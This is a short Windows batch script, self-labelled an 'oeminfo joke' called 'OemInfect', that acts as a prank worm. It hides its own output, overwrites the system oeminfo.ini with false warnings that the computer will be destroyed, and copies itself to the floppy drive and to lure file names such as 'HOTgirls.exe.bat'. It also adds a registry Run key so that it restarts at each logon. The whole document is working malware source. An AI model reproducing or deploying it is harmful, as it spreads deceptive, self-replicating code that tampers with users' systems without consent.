ctty nul
echo off
echo [general]>C:\WINDOWS\system\oeminfo.ini
echo Manufacturer=Not touch>>C:\WINDOWS\system\oeminfo.ini
echo Model=Explosive>>C:\WINDOWS\system\oeminfo.ini
echo
echo [OEMSpecific]>>C:\WINDOWS\system\oeminfo.ini
echo "SubModel=<My Computer>" >>C:\WINDOWS\system\oeminfo.ini
echo "SerialNo=<170184>" >>C:\WINDOWS\system\oeminfo.ini
echo  "OEM1=<13.01.03>" >>C:\WINDOWS\system\oeminfo.ini
echo "OEM2=<Eintrag>" >>C:\WINDOWS\system\oeminfo.ini
echo [Support Information]>>C:\WINDOWS\system\oeminfo.ini
echo Line1=Danger!>>C:\WINDOWS\system\oeminfo.ini
echo Line2=Your computer will be destroyed! >>C:\WINDOWS\system\oeminfo.ini
echo Line3=The dangerous mistake in a consequence on your computer was found the very dangerous virus has got! >>C:\WINDOWS\system\oeminfo.ini
echo Line4=He format your winchester, spoils CMOS, burns the monitor and hypnosis your mind!!! >>C:\WINDOWS\system\oeminfo.ini
echo Line5=Never more include your computer!! >>C:\WINDOWS\system\oeminfo.ini
copy %0 A:\HotNews.txt.bat
copy %0 %windir%\oem.bat
md C:\HOTgames
copy %0 c:\HOTgames\HOTgirls.exe.bat
copy %0 c:\HOTgame.exe.bat
subst Y: c:\HOTgames
echo REGEDIT4>C:\yos.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\yos.reg
echo "oemexp"="%windir%\oem.bat" >> C:\yos.reg
regedit /s C:\yos.reg
del C:\yos.reg
echo This is oeminfo joke. >>C:\info.txt
echo Name "OemInfect" >>C:\info.txt
echo By Aleks >>C:\info.txt
echo top50@inbox.ru >>C:\info.txt
echo Ukraine >>C:\info.txt
echo  13.01.2003 >>C:\info.txt
ctty con
cls